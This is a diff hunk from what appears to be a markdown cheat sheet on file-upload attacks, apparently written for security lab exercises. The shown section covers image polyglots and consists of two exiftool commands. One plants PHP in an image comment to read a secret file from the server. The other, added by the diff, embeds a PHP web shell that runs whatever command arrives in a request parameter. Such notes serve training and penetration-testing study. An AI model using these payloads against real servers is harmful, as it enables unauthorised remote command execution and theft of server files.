@@ -77,6 +77,9 @@ application/xml (XXE)
 - Files appear as images but execute code.
 ```bash
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hat_only.png -o polyglot.php
+
+exiftool -DocumentName="<h1>Testing<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" frog.jpg
+
 ```
 
 ### 06 - PUT method
